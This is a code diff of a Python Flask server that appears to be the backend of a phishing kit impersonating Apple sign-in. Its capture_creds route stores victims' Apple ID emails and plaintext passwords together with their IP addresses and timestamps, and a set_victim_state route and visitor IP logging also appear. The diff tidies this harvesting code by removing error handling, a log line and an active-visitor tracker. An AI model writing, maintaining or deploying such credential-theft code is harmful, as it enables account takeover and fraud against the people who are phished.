@@ -18,7 +18,7 @@ from webauthn.helpers.structs import (
     AuthenticationCredential,
 )
 from webauthn.helpers.cose import COSEAlgorithmIdentifier
-from datetime import datetime, timedelta
+from datetime import datetime
 
 app = Flask(__name__, static_folder=None)
 CORS(app)
@@ -37,11 +37,8 @@ if CREDS_JSON_FILE.exists():
         stored_creds = []
 
 def save_creds():
-    try:
-        with open(CREDS_JSON_FILE, 'w') as f:
-            json.dump(stored_creds, f)
-    except Exception as e:
-        logger.error(f"Error saving creds: {e}")
+    with open(CREDS_JSON_FILE, 'w') as f:
+        json.dump(stored_creds, f)
 
 registered_credentials = {}
 challenge_store = {}
@@ -390,7 +387,6 @@ def capture_creds():
         
         stored_creds.append({'email': appleid, 'password': password, 'ip': request.remote_addr, 'time': datetime.now().strftime('%Y-%m-%d_%H-%M-%S')})
         save_creds()
-        logger.info(f"Saved credential: {appleid}")
         
         with open(creds_dir / 'all_credentials.log', 'a') as f:
             f.write(f"[{ts}] {appleid}\n")
@@ -600,7 +596,6 @@ def set_victim_state():
 
 IP_LOG_FILE = BASE_DIR / 'visitor_ips.json'
 visitor_ips = []
-active_visitors = {}
 if IP_LOG_FILE.exists():
     try:
         with open(IP_LOG_FILE, 'r') as f:
@@ -611,25 +606,6 @@ if IP_LOG_FILE.exists():
 def save_ips():
     with open(IP_LOG_FILE, 'w') as f:
         json.dump(visitor_ips, f)
-
-@app.route('/api/heartbeat')
-def heartbeat():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip:
-        ip = ip.split(',')[0].strip()
-        active_visitors[ip] = datetime.now().isoformat()
-        return jsonify({'status': 'ok'})
-    return jsonify({'status': 'no_ip'})
-
-@app.route('/api/get-active')
-def get_active():
-    now = datetime.now()
-    active = []
-    cutoff = (now - timedelta(seconds=30)).isoformat()
-    for ip, last_seen in list(active_visitors.items()):
-        if last_seen > cutoff:
-            active.append(ip)
-    return jsonify({'count': len(active), 'visitors': active})
 
 @app.before_request
 def log_visitor_ip():
